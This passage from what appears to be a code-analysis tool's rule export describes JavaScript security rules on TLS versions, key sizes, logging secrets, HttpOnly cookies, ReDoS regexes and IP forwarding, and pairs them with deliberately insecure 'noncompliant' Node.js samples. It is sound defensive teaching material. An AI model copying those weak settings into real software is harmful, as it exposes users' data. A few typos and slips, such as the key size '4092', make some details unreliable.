<code>secureOptions</code>, which in this example instructs the OpenSSL protocol to turn off some algorithms altogether. In general, this\noption might trigger side effects and should be used carefully, if used at all.</p>\n<pre data-diff-id=\"13\" data-diff-type=\"noncompliant\">\nconst https     = require('node:https');\nconst tls       = require('node:tls');\nconst constants = require('node:crypto'):\n\nlet options = {\n  secureOptions:\n    constants.SSL_OP_NO_SSLv2\n    | constants.SSL_OP_NO_SSLv3\n    | constants.SSL_OP_NO_TLSv1\n}; // Noncompliant\n\nlet req    = https.request(options, (res) =&gt; { });\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; { });\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nconst https = require('node:https');\nconst tls   = require('node:tls');\n\nlet options = {\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet req    = https.request(options, (res) =&gt; { });\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; { });\n</pre>\n<pre data-diff-id=\"12\" data-diff-type=\"compliant\">\nconst https = require('node:https');\nconst tls   = require('node:tls');\n\nlet options = {\n  minVersion: 'TLSv1.2',\n  maxVersion: 'TLSv1.2'\n};\n\nlet req    = https.request(options, (res) =&gt; { });\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; { });\n</pre>\n<p>Here, the goal is to turn on only TLSv1.2 and higher, by turning off all lower versions:</p>\n<pre data-diff-id=\"13\" data-diff-type=\"compliant\">\nconst https = require('node:https');\nconst tls   = require('node:tls');\n\nlet options = {\n  secureOptions:\n    constants.SSL_OP_NO_SSLv2\n    | constants.SSL_OP_NO_SSLv3\n    | constants.SSL_OP_NO_TLSv1\n    | constants.SSL_OP_NO_TLSv1_1\n};\n\nlet req    = https.request(options, (res) =&gt; { });\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; { });\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S4426": {
        "name": "Cryptographic keys should be robust",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>\n<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>\n<ul>\n  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>\n  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.\n    <ul>\n      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key\n      Derivation Function 2) </li>\n    </ul>  </li>\n</ul>\n<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at\nthe plaintext.</p>\n<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this\ndata after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the\nalgorithm.</p>\n<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,\na 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>\n<h4>Noncompliant code example</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst crypto = require('crypto');\n\nfunction callback(err, pub, priv) {}\n\nvar { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {\n    modulusLength: 1024,  // Noncompliant\n    publicKeyEncoding:  { type: 'spki', format: 'pem' },\n    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }\n  },\n  callback);\n</pre>\n<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nconst crypto = require('crypto');\n\nfunction callback(err, pub, priv) {}\n\nvar { privateKey, publicKey } = crypto.generateKeyPairSync('dsa', {\n    modulusLength: 1024,  // Noncompliant\n    publicKeyEncoding:  { type: 'spki', format: 'pem' },\n    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }\n  },\n  callback);\n</pre>\n<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve\nname:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nconst crypto = require('crypto');\n\nfunction callback(err, pub, priv) {}\n\nvar { privateKey, publicKey } = crypto.generateKeyPair('ec', {\n    namedCurve: 'secp112r2', // Noncompliant\n    publicKeyEncoding:  { type: 'spki', format: 'pem' },\n    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }\n  },\n  callback);\n</pre>\n<h4>Compliant solution</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst crypto = require('crypto');\n\nfunction callback(err, pub, priv) {}\n\nvar { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {\n    modulusLength: 2048,\n    publicKeyEncoding:  { type: 'spki', format: 'pem' },\n    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }\n  },\n  callback);\n</pre>\n<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nconst crypto = require('crypto');\n\nfunction callback(err, pub, priv) {}\n\nvar { privateKey, publicKey } = crypto.generateKeyPairSync('dsa', {\n    modulusLength: 2048,\n    publicKeyEncoding:  { type: 'spki', format: 'pem' },\n    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }\n  },\n  callback);\n</pre>\n<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve\nname:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nconst crypto = require('crypto');\n\nfunction callback(err, pub, priv) {}\n\nvar { privateKey, publicKey } = crypto.generateKeyPair('ec', {\n    namedCurve: 'secp224k1',\n    publicKeyEncoding:  { type: 'spki', format: 'pem' },\n    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }\n  },\n  callback);\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>\n<p>The appropriate choices are the following.</p>\n<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>\n<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>\n<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of\n<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>\n<h4>AES (Advanced Encryption Standard)</h4>\n<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying\nall possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.\nTherefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>\n<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>\n<h4>Elliptic Curve Cryptography (ECC)</h4>\n<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve\nalgorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>\n<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>\n<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve\nparameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves\ncurrently include:</p>\n<ul>\n  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>\n  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>\n  <li> Curve448. </li>\n  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>\n</ul>\n<h3>Going the extra mile</h3>\n<h4>Pre-Quantum Cryptography</h4>\n<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep\nin mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or\n\"post-quantum\") counterpart.</p>\n<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>\n<p><a href=\"https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation\">Learn more here</a>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> Documentation\n    <ul>\n      <li> NIST Documentation - <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf\">NIST SP 800-186: Recommendations\n      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>\n      <li> IETF - <a href=\"https://datatracker.ietf.org/doc/html/rfc5639\">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and\n      Curve Generation</a> </li>\n    </ul>  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5757": {
        "name": "Allowing confidential information to be logged is security-sensitive",
        "htmlDesc": "<p>Log management is an important topic, especially for the security of a web application, to ensure user activity, including potential attackers, is\nrecorded and available for an analyst to understand what’s happened on the web application in case of malicious activities.</p>\n<p>Retention of specific logs for a defined period of time is often necessary to comply with regulations such as GDPR, <a\nhref=\"https://www.pcisecuritystandards.org/documents/Effective-Daily-Log-Monitoring-Guidance.pdf\">PCI DSS</a> and others. However, to protect user’s\nprivacy, certain informations are forbidden or strongly discouraged from being logged, such as user passwords or credit card numbers, which obviously\nshould not be stored or at least not in clear text.</p>\n<h2>Ask Yourself Whether</h2>\n<p>In a production environment:</p>\n<ul>\n  <li> The web application uses confidential information and logs a significant amount of data. </li>\n  <li> Logs are externalized to SIEM or Big Data repositories. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Loggers should be configured with a list of confidential, personal information that will be hidden/masked or removed from logs.</p>\n<h2>Sensitive Code Example</h2>\n<p>With <a href=\"https://www.npmjs.com/package/signale\">Signale log management framework</a> the code is sensitive when an empty list of secrets is\ndefined:</p>\n<pre>\nconst { Signale } = require('signale');\n\nconst CREDIT_CARD_NUMBERS = fetchFromWebForm()\n// here we suppose the credit card numbers are retrieved somewhere and CREDIT_CARD_NUMBERS looks like [\"1234-5678-0000-9999\", \"1234-5678-0000-8888\"]; for instance\n\nconst options = {\n  secrets: []         // empty list of secrets\n};\n\nconst logger = new Signale(options); // Sensitive\n\nCREDIT_CARD_NUMBERS.forEach(function(CREDIT_CARD_NUMBER) {\n  logger.log('The customer ordered products with the credit card number = %s', CREDIT_CARD_NUMBER);\n});\n</pre>\n<h2>Compliant Solution</h2>\n<p>With <a href=\"https://www.npmjs.com/package/signale\">Signale log management framework</a> it is possible to define a list of secrets that will be\nhidden in logs:</p>\n<pre>\nconst { Signale } = require('signale');\n\nconst CREDIT_CARD_NUMBERS = fetchFromWebForm()\n// here we suppose the credit card numbers are retrieved somewhere and CREDIT_CARD_NUMBERS looks like [\"1234-5678-0000-9999\", \"1234-5678-0000-8888\"]; for instance\n\nconst options = {\n  secrets: [\"([0-9]{4}-?)+\"]\n};\n\nconst logger = new Signale(options); // Compliant\n\nCREDIT_CARD_NUMBERS.forEach(function(CREDIT_CARD_NUMBER) {\n  logger.log('The customer ordered products with the credit card number = %s', CREDIT_CARD_NUMBER);\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/532\">CWE-532 - Insertion of Sensitive Information into Log File</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S3330": {
        "name": "Creating cookies without the \"HttpOnly\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will\nbe able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer\nto decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target\nthe theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS\nvulnerability to steal session-cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>\n  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)\n  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /\n  sensitive-security cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/cookie-session\">cookie-session</a> module:</p>\n<pre>\nlet session = cookieSession({\n  httpOnly: false,// Sensitive\n});  // Sensitive\n</pre>\n<p><a href=\"https://www.npmjs.com/package/express-session\">express-session</a> module:</p>\n<pre>\nconst express = require('express'),\nconst session = require('express-session'),\n\nlet app = express()\napp.use(session({\n  cookie:\n  {\n    httpOnly: false // Sensitive\n  }\n})),\n</pre>\n<p><a href=\"https://www.npmjs.com/package/cookies\">cookies</a> module:</p>\n<pre>\nlet cookies = new Cookies(req, res, { keys: keys });\n\ncookies.set('LastVisit', new Date().toISOString(), {\n  httpOnly: false // Sensitive\n}); // Sensitive\n</pre>\n<p><a href=\"https://www.npmjs.com/package/csurf\">csurf</a> module:</p>\n<pre>\nconst cookieParser = require('cookie-parser');\nconst csrf = require('csurf');\nconst express = require('express');\n\nlet csrfProtection = csrf({ cookie: { httpOnly: false }}); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/cookie-session\">cookie-session</a> module:</p>\n<pre>\nlet session = cookieSession({\n  httpOnly: true,// Compliant\n});  // Compliant\n</pre>\n<p><a href=\"https://www.npmjs.com/package/express-session\">express-session</a> module:</p>\n<pre>\nconst express = require('express');\nconst session = require('express-session');\n\nlet app = express();\napp.use(session({\n  cookie:\n  {\n    httpOnly: true // Compliant\n  }\n}));\n</pre>\n<p><a href=\"https://www.npmjs.com/package/cookies\">cookies</a> module:</p>\n<pre>\nlet cookies = new Cookies(req, res, { keys: keys });\n\ncookies.set('LastVisit', new Date().toISOString(), {\n  httpOnly: true // Compliant\n}); // Compliant\n</pre>\n<p><a href=\"https://www.npmjs.com/package/csurf\">csurf</a> module:</p>\n<pre>\nconst cookieParser = require('cookie-parser');\nconst csrf = require('csurf');\nconst express = require('express');\n\nlet csrfProtection = csrf({ cookie: { httpOnly: true }}); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/HttpOnly\">OWASP HttpOnly</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1004\">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE\">HTTPONLY_COOKIE</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S4784": {
        "name": "Using regular expressions is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS5852'>S5852</a> instead.</p>\n<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021\">CVE-2017-16021</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863\">CVE-2018-13863</a> </li>\n</ul>\n<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as\n<code>(a+)+s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with\nevery additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular\nexpression, <code>a+s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>\n<p>Evaluating such regular expressions opens the door to <a\nhref=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">Regular expression Denial of Service (ReDoS)</a> attacks.\nIn the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making\nthe service inaccessible to genuine users.</p>\n<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following\ncharacters: <code>*+{</code>.</p>\n<p>Example: <code>(a+)*</code></p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li>\n  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for\nvulnerability reports mentioning the one engine you’re are using.</p>\n<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href=\"https://github.com/google/re2\">Google Re2</a>.</p>\n<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst regex = /(a+)+b/; // Sensitive\nconst regex2 = new RegExp(\"(a+)+b\"); // Sensitive\n\nstr.search(\"(a+)+b\"); // Sensitive\nstr.match(\"(a+)+b\"); // Sensitive\nstr.split(\"(a+)+b\"); // Sensitive\n</pre>\n<p>Note: String.matchAll does not raise any issue as it is not supported by NodeJS.</p>\n<h2>Exceptions</h2>\n<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)+</code>,\n<code>(a|a?)+</code>.</p>\n<p>It is a good idea to test your regular expression if it has the same pattern on both side of a \"<code>|</code>\".</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">CWE-624 - Executable Regular Expression\n  Error</a> </li>\n  <li> OWASP Regular expression Denial of Service - ReDoS </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5759": {
        "name": "Forwarding client IP address is security-sensitive",
        "htmlDesc": "<p>Users often connect to web servers through HTTP proxies.</p>\n<p>Proxy can be configured to forward the client IP address via the <code>X-Forwarded-For</code> or <code>Forwarded</code> HTTP headers.</p>\n<p>IP address is a personal information which can identify a single user and thus impact his privacy.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The web application uses reverse proxies or similar but doesn’t need to know the IP address of the user. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>User IP address should not be forwarded unless the application needs it, as part of an authentication, authorization scheme or log management for\nexamples.</p>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://github.com/http-party/node-http-proxy\">node-http-proxy</a></p>\n<pre>\nvar httpProxy = require('http-proxy');\n\nhttpProxy.createProxyServer({target:'http://localhost:9000', xfwd:true}) // Noncompliant\n  .listen(8000);\n</pre>\n<p><a href=\"https://github.com/chimurai/http-proxy-middleware\">http-proxy-middleware</a></p>\n<pre>\nvar express = require('express');\n\nconst { createProxyMiddleware } = require('http-proxy-middleware');\n\nconst app = express();\n\napp.use('/proxy', createProxyMiddleware({ target: 'http://localhost:9000', changeOrigin: true, xfwd: true })); // Noncompliant\napp.listen(3000);\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://github.com/http-party/node-http-proxy\">node-http-proxy</a></p>\n<pre>\nvar httpProxy = require('http-proxy');\n\n// By default xfwd option is false\nhttpProxy.createProxyServer({target:'http://localhost:9000'}) // Compliant\n  .listen(8000);\n</pre>\n<p><a href=\"https://github.com/chimurai/http-proxy-middleware\">http-proxy-middleware</a></p>\n<pre>\nvar express = require('express');\n\nconst { createProxyMiddleware } = require('http-proxy-middleware');\n\nconst app = express();\n\n// By default xfwd option is false\napp.use('/proxy', createProxyMiddleware({ target: 'http://localhost:9000', changeOrigin: true})); // Compliant\napp.listen(3000);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For\">developer.mozilla.org</a> - X-Forwarded-For </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S2255": {
        "name": "Writing cookies is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11639\">CVE-2018-11639</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537\">CVE-2016-6537</a> </li>\n</ul>\n<p>Attackers can use widely-available tools to read cookies. Any sensitive information they may contain will be exposed.</p>\n<p>This rule flags code that writes cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> sensitive information is stored inside the cookie. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the\nuser session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer\nthan the user session.</p>\n<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the\noriginal information will be exposed.</p>\n<p>Using cookies only for session IDs doesn’t make them secure. Follow 